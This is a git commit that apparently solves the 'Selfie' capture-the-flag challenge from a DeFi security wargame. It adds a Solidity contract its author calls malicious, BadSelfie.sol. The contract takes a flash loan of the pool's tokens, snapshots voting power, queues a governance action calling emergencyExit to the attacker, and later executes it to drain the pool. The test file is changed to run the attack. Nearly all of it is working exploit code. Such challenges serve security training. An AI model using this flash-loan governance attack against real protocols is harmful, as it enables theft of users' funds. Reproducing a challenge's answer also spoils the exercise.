4ad913369503ca73c46685f8c4376aa5b40be913
Kent Miguel <kentmiguel10@gmail.com>
2023-02-26 23:34:08 +0100

    Solution for Selfie challenge

---
+++ contracts/selfie/BadSelfie.sol
@@ -0,0 +1,123 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./SimpleGovernance.sol";
+import "./SelfiePool.sol";
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
+
+// import "../DamnValuableToken.sol";
+import "../DamnValuableTokenSnapshot.sol";
+
+/**
+ * @title BadGovernance.sol
+ * @author Kent Miguel
+ * @notice This contract is a malicious contract used to drain DVT tokens from pool using the SimpleGovernance contract
+ */
+contract BadSelfie is IERC3156FlashBorrower {
+    SelfiePool private immutable selfiePool;
+    SimpleGovernance private immutable simpleGovernance;
+    ERC20Snapshot public immutable snapToken;
+    DamnValuableTokenSnapshot public immutable dvt;
+
+    address tokenAddress;
+    uint256 attackActionId;
+    uint256 tokenAmount;
+    address attacker;
+
+    //DamnValuableToken public immutable token;
+
+    /**
+     * Initialize pool, governance, and token
+     */
+    constructor(
+        address _selfiePool,
+        address _simpleGovernance,
+        address _token,
+        address _snapToken,
+        address _attacker
+    ) {
+        selfiePool = SelfiePool(_selfiePool);
+        simpleGovernance = SimpleGovernance(_simpleGovernance);
+        tokenAddress = _token;
+        snapToken = ERC20Snapshot(_snapToken);
+        dvt = DamnValuableTokenSnapshot(_snapToken);
+        attacker = _attacker;
+    }
+
+    /**
+     * Get flashLoan() -> queueAction -> return flashLoan
+     * move block 2 days
+     */
+    function attackPhase1() public {
+        selfiePool.flashLoan(
+            IERC3156FlashBorrower(address(this)),
+            tokenAddress,
+            selfiePool.maxFlashLoan(tokenAddress),
+            // selfiePool.flashFee(tokenAddress, 0),
+            bytes("")
+        );
+    }
+
+    /**
+     * after moving 2 days...
+     * Call executeAction(actionId)
+     */
+    function attackPhase2() public {
+        //governance contract will execute which will bypass onlyGovernance modifier
+        simpleGovernance.executeAction(attackActionId);
+    }
+
+    /**
+     *
+     * @param _receiver - initiator of loan which is this address
+     * @param _token - loan currency which is DVT
+     * @param _amount - amount of tokens
+     * @param _fee - additional amount to repay
+     * @param data - can just be empty ???  bytes("")
+     *
+     * must return callback message keccak256("ERC3156FlashBorrower.onFlashLoan")
+     * @dev will call governance's queueAction
+     */
+    function onFlashLoan(
+        address _receiver,
+        address _token,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        //get loan
+        tokenAmount = snapToken.balanceOf(address(this));
+        //approve to transfer token
+        ERC20(tokenAddress).approve(address(selfiePool), _amount);
+        ERC20(tokenAddress).approve(address(this), _amount);
+        ERC20(tokenAddress).approve(msg.sender, _amount);
+        //take snapshot
+        dvt.snapshot();
+
+        // //queue action - need to pass NotEnoughVotes...
+        attackActionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            uint128(0),
+            abi.encodeWithSignature("emergencyExit(address)", attacker)
+        );
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function getAttackId() external view returns (uint256) {
+        return attackActionId;
+    }
+
+    function getTokenAmount() external view returns (uint256) {
+        return tokenAmount;
+    }
+
+    function getMaxFlashLoan() external view returns (uint256) {
+        return selfiePool.maxFlashLoan(tokenAddress);
+    }
+
+    receive() external payable {
+        tokenAmount = snapToken.balanceOf(address(this));
+    }
+}
--- test/selfie/selfie.challenge.js
+++ test/selfie/selfie.challenge.js
@@ -1,55 +1,80 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 const { time } = require("@nomicfoundation/hardhat-network-helpers");
 
-describe('[Challenge] Selfie', function () {
-    let deployer, player;
-    let token, governance, pool;
+describe("[Challenge] Selfie", function () {
+  let deployer, player;
+  let token, governance, pool;
 
-    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
-    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
-    
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+  const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
+  const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
 
-        // Deploy Damn Valuable Token Snapshot
-        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, player] = await ethers.getSigners();
 
-        // Deploy governance contract
-        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
-        expect(await governance.getActionCounter()).to.eq(1);
+    // Deploy Damn Valuable Token Snapshot
+    token = await (
+      await ethers.getContractFactory("DamnValuableTokenSnapshot", deployer)
+    ).deploy(TOKEN_INITIAL_SUPPLY);
 
-        // Deploy the pool
-        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
-            token.address,
-            governance.address    
-        );
-        expect(await pool.token()).to.eq(token.address);
-        expect(await pool.governance()).to.eq(governance.address);
-        
-        // Fund the pool
-        await token.transfer(pool.address, TOKENS_IN_POOL);
-        await token.snapshot();
-        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
-        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
-        expect(await pool.flashFee(token.address, 0)).to.eq(0);
+    // Deploy governance contract
+    governance = await (
+      await ethers.getContractFactory("SimpleGovernance", deployer)
+    ).deploy(token.address);
+    expect(await governance.getActionCounter()).to.eq(1);
 
-    });
+    // Deploy the pool
+    pool = await (
+      await ethers.getContractFactory("SelfiePool", deployer)
+    ).deploy(token.address, governance.address);
+    expect(await pool.token()).to.eq(token.address);
+    expect(await pool.governance()).to.eq(governance.address);
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+    // Fund the pool
+    await token.transfer(pool.address, TOKENS_IN_POOL);
+    await token.snapshot();
+    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
+    expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
+    expect(await pool.flashFee(token.address, 0)).to.eq(0);
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
 
-        // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.be.equal(TOKENS_IN_POOL);        
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.be.equal(0);
-    });
+    //get contract
+    let badSelfie = await await (
+      await ethers.getContractFactory("BadSelfie", player)
+    ).deploy(
+      pool.address,
+      governance.address,
+      token.address,
+      token.address,
+      player.address
+    );
+
+    //Initiate flashLoan
+    console.log("Trial: Initiate FlashLoan");
+
+    //Initiate Phase 1
+    await badSelfie.connect(player).attackPhase1();
+
+    //at this point we have queued the action... maybe check action again... and the action needs to be to emergencyExit so the governance will execute it and pass the onlyGovernance modifier..
+
+    //move 2 days....
+    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+
+    //next step is to execute action...
+    await badSelfie.connect(player).attackPhase2();
+    console.log("Tokens in player: ", await token.balanceOf(player.address));
+    console.log("Tokens in pool: ", await token.balanceOf(pool.address));
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    // Player has taken all tokens from the pool
+    expect(await token.balanceOf(player.address)).to.be.equal(TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.be.equal(0);
+  });
 });
